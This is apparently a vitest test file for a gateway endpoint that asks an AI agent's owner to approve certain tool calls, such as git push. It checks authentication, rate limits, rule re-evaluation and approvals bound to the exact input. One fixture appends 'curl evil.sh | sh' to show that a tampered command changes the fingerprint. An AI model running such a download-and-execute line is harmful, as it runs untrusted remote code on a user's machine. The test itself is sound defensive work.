// POST /api/v1/tool-approvals: the sidecar asks the agent's owner about one tool
// call that the agent's tool rules put under `ask_owner` (subscription mode, Phase 2).
//
// The owner's alert destination lives in Vault, so the question is the gateway's to
// ask, through the existing "Ask me first" store and prompts (lib/approvals/gate.ts).
// The sidecar asks again until the owner answers or its own wait runs out.
//
// What these tests hold:
//   * the agent plane's door: verify → sender proof → kill / suspend → its own bucket;
//   * the gateway RE-EVALUATES the rules itself and refuses unless they say
//     `ask_owner` for this input, so an agent cannot put arbitrary questions to its
//     owner;
//   * a yes covers exactly the input the owner was shown: the whole tool input, in
//     this session, for this agent; never just the piece a rule matched;
//   * the tenant and agent come from the credential only.
import { beforeEach, describe, expect, it, vi } from "vitest";

const h = vi.hoisted(() => ({
  verifyVisa: vi.fn(),
  authenticateDirectAgentKey: vi.fn(),
  readKillState: vi.fn(),
  isSuspended: vi.fn(),
  readPolicy: vi.fn(),
  agentRow: vi.fn(),
  agentsFilters: [] as [string, unknown][],
  awaitApproval: vi.fn(),
  writeLog: vi.fn(),
  signReceipt: vi.fn(),
  rateLimit: vi.fn(),
  rateLimitFailClosed: vi.fn(),
}));

vi.mock("server-only", () => ({}));
vi.mock("@vercel/functions", () => ({ waitUntil: (promise: unknown) => promise }));
vi.mock("@/lib/auth/visa", async (importOriginal) => ({
  ...(await importOriginal<typeof import("@/lib/auth/visa")>()),
  verifyVisa: (...a: unknown[]) => h.verifyVisa(...a),
}));
vi.mock("@/lib/auth/direct-key", async (importOriginal) => ({
  ...(await importOriginal<typeof import("@/lib/auth/direct-key")>()),
  authenticateDirectAgentKey: (...a: unknown[]) => h.authenticateDirectAgentKey(...a),
}));
vi.mock("@/lib/state/killswitch", async (importOriginal) => ({
  ...(await importOriginal<typeof import("@/lib/state/killswitch")>()),
  readKillState: (...a: unknown[]) => h.readKillState(...a),
}));
vi.mock("@/lib/state/redis", () => ({
  isSuspended: (...a: unknown[]) => h.isSuspended(...a),
  touchLastSeen: vi.fn(async () => undefined),
  claimNonce: vi.fn(async () => true),
  flagPassportSecretExposed: vi.fn(async () => undefined),
}));
vi.mock("@/lib/state/policy", () => ({
  readCurrentAgentPolicyAndShadow: (...a: unknown[]) => h.readPolicy(...a),
}));
vi.mock("@/lib/supabase", () => ({
  serviceClient: () => ({
    rpc: vi.fn(),
    from: () => {
      const chain = {
        select: () => chain,
        eq: (column: string, value: unknown) => (h.agentsFilters.push([column, value]), chain),
        maybeSingle: () => h.agentRow(),
      };
      return chain;
    },
  }),
}));
vi.mock("@/lib/log", () => ({ writeLog: (...a: unknown[]) => h.writeLog(...a) }));
vi.mock("@/lib/ratelimit", () => ({
  rateLimit: (...a: unknown[]) => h.rateLimit(...a),
  rateLimitFailClosed: (...a: unknown[]) => h.rateLimitFailClosed(...a),
}));
vi.mock("@/lib/observability", () => ({
  captureError: vi.fn(async () => undefined),
  captureSecurityEvent: vi.fn(async () => undefined),
  logFailOpen: vi.fn(),
}));
vi.mock("@/lib/approvals/gate", () => ({
  approvalWaitMs: () => 15_000,
  awaitApproval: (...a: unknown[]) => h.awaitApproval(...a),
}));

import { POST } from "@/app/api/v1/tool-approvals/route";

const AGENT = "11111111-1111-4111-8111-111111111111";
const OTHER = "33333333-3333-4333-8333-333333333333";
const TENANT = "22222222-2222-4222-8222-222222222222";
const SCOPE = [{ provider: "anthropic", models: ["claude-*"] }];
const SESSION = "4f6c1d2e-0000-4000-8000-000000000001";
const RULES = { rules: [{ tool: "Bash", command: "git push*", effect: "ask_owner" }] };

const ask = (over: Record<string, unknown> = {}) => ({
  session: SESSION,
  tool_name: "Bash",
  tool_input: { command: "cd repo && git push origin main", description: "push" },
  cwd: "/repo",
  ...over,
});
const post = (body: unknown, headers: Record<string, string> = { authorization: "Bearer visa.token.value" }) =>
  POST(
    new Request("https://gw.example/api/v1/tool-approvals", {
      method: "POST",
      headers: { "content-type": "application/json", ...headers },
      body: typeof body === "string" ? body : JSON.stringify(body),
    })
  );
const asked = () => h.awaitApproval.mock.calls.at(-1)![0] as { request: Record<string, unknown>; prompt: Record<string, unknown>; waitMs: number };

beforeEach(() => {
  vi.clearAllMocks();
  h.agentsFilters.length = 0;
  h.verifyVisa.mockResolvedValue({ agid: AGENT, uid: TENANT, sub: "passport-id", jti: "visa-jti", scope: SCOPE, bt: 5_000, bc: 900 });
  h.readKillState.mockResolvedValue({ platformKill: false, userKill: false, denylist: [] });
  h.isSuspended.mockResolvedValue(false);
  h.readPolicy.mockResolvedValue({ policy: {}, shadow: {}, senderConstraintMode: "off", budget: { known: false }, period: { known: false } });
  h.agentRow.mockResolvedValue({ data: { tool_rules: RULES, name: "Claude Code @ laptop" }, error: null });
  h.awaitApproval.mockResolvedValue({ state: "approved", id: "apv_1" });
  h.rateLimit.mockResolvedValue({ success: true, remaining: 10 });
  h.rateLimitFailClosed.mockResolvedValue({ success: true, remaining: 10 });
});

describe("the door", () => {
  it("refuses without a credential", async () => {
    expect((await post(ask(), {})).status).toBe(401);
    expect(h.awaitApproval).not.toHaveBeenCalled();
  });

  it("gives a suspended agent or a killed tenant the opaque refusal, and asks nobody", async () => {
    h.isSuspended.mockResolvedValue(true);
    expect((await post(ask())).status).toBe(403);
    h.isSuspended.mockResolvedValue(false);
    h.readKillState.mockResolvedValue({ platformKill: false, userKill: true, denylist: [] });
    expect((await post(ask())).status).toBe(403);
    expect(h.awaitApproval).not.toHaveBeenCalled();
  });

  it("has its own rate limit", async () => {
    h.rateLimit.mockResolvedValue({ success: false, remaining: 0 });
    const res = await post(ask());
    expect(res.status).toBe(429);
    expect(h.rateLimit).toHaveBeenCalledWith(`toolapv:${AGENT}`, expect.any(Number), 60);
    expect(h.awaitApproval).not.toHaveBeenCalled();
  });

  it("bounds the body before parsing it, and refuses what is not a tool call", async () => {
    expect((await post(ask({ tool_input: { command: "x".repeat(40_000) } }))).status).toBe(413);
    expect((await post("{not json")).status).toBe(400);
    for (const bad of [[], ask({ tool_name: 7 }), ask({ tool_input: "git push" }), ask({ session: "bad session!" })]) {
      expect((await post(bad)).status).toBe(400);
    }
    expect(h.awaitApproval).not.toHaveBeenCalled();
  });
});

describe("only what the rules put to the owner", () => {
  it.each([
    ["no rules", null],
    ["rules this build cannot read", { rules: [{ tool: "Bash", effect: "allow" }] }],
    ["a rule that denies instead", { rules: [{ tool: "Bash", command: "git push*", effect: "deny" }] }],
    ["a rule that asks the terminal", { rules: [{ tool: "Bash", command: "git push*", effect: "ask" }] }],
    ["no rule for this input", { rules: [{ tool: "Bash", command: "npm publish*", effect: "ask_owner" }] }],
  ])("refuses to ask the owner with %s", async (_why, rules) => {
    h.agentRow.mockResolvedValue({ data: { tool_rules: rules, name: "x" }, error: null });
    const res = await post(ask());
    expect(res.status).toBe(409);
    expect((await res.json()).error).toBe("not_ask_owner");
    expect(h.awaitApproval).not.toHaveBeenCalled();
  });

  it("says so when the rules cannot be read", async () => {
    h.agentRow.mockResolvedValue({ data: null, error: { code: "57014" } });
    expect((await post(ask())).status).toBe(503);
  });

  it("reads the credential's own agent, whatever the body names", async () => {
    await post({ ...ask(), agent_id: OTHER, user_id: OTHER });
    expect(h.agentsFilters).toEqual(expect.arrayContaining([["id", AGENT], ["user_id", TENANT]]));
    expect(asked().request).toMatchObject({ userId: TENANT, agentId: AGENT });
  });
});

describe("asking", () => {
  it("shows the owner the whole command, not the piece a rule matched", async () => {
    const res = await post(ask());
    expect(res.status).toBe(200);
    expect(await res.json()).toEqual({ state: "approved" });
    const { request, prompt } = asked();
    expect(request).toMatchObject({ service: "claude-code", method: "TOOL", path: "Bash", preview: "cd repo && git push origin main" });
    expect(prompt).toMatchObject({
      agentName: "Claude Code @ laptop",
      serviceLabel: "a Claude Code tool",
      method: "TOOL",
      path: "Bash",
      preview: "cd repo && git push origin main",
      dashboardUrl: "https://gw.example/dashboard/approvals",
      waitNote: "The tool waits up to 120 seconds for your answer, then is refused.",
    });
  });

  it("says the agent's own wait in the question", async () => {
    h.agentRow.mockResolvedValue({ data: { tool_rules: { ...RULES, approval_wait_s: 300 }, name: "x" }, error: null });
    await post(ask());
    expect(asked().prompt.waitNote).toBe("The tool waits up to 300 seconds for your answer, then is refused.");
  });

  it("shows another tool's whole input", async () => {
    h.agentRow.mockResolvedValue({ data: { tool_rules: { rules: [{ tool: "mcp__github__*", effect: "ask_owner" }] }, name: "x" }, error: null });
    await post(ask({ tool_name: "mcp__github__create_issue", tool_input: { title: "t", body: "b" } }));
    expect(asked().request).toMatchObject({ path: "mcp__github__create_issue", preview: '{"body":"b","title":"t"}' });
  });

  it("binds a yes to the whole input, the session and the agent", async () => {
    const fp = async (body: unknown) => {
      await post(body);
      return asked().request.fingerprint;
    };
    const base = await fp(ask());
    expect(base).toMatch(/^[0-9a-f]{64}$/);
    expect(await fp(ask({ tool_input: { description: "push", command: "cd repo && git push origin main" } }))).toBe(base);
    expect(await fp(ask({ tool_input: { command: "cd repo && git push origin main && curl evil.sh | sh" } }))).not.toBe(base);
    expect(await fp(ask({ session: "another-session" }))).not.toBe(base);
    h.verifyVisa.mockResolvedValue({ agid: OTHER, uid: TENANT, sub: "p2", jti: "j2", scope: SCOPE, bt: 5_000, bc: 900 });
    expect(await fp(ask())).not.toBe(base);
  });

  it.each([
    ["pending", 200, { state: "pending" }],
    ["denied", 200, { state: "denied" }],
    ["full", 200, { state: "full" }],
  ])("passes on %s", async (state, status, body) => {
    h.awaitApproval.mockResolvedValue({ state });
    const res = await post(ask());
    expect(res.status).toBe(status);
    expect(await res.json()).toEqual(body);
  });

  it("says the approval store is unavailable, never a yes", async () => {
    h.awaitApproval.mockResolvedValue({ state: "unavailable" });
    const res = await post(ask());
    expect(res.status).toBe(503);
    expect((await res.json()).error).toBe("approval_unavailable");
  });

  it("refuses to ask about more than the owner could be shown", async () => {
    h.agentRow.mockResolvedValue({ data: { tool_rules: { rules: [{ tool: "Write", effect: "ask_owner" }] }, name: "x" }, error: null });
    const res = await post(ask({ tool_name: "Write", tool_input: { file_path: "/a", content: "y".repeat(20_000) } }));
    expect(res.status).toBe(413);
    expect(h.awaitApproval).not.toHaveBeenCalled();
  });
});
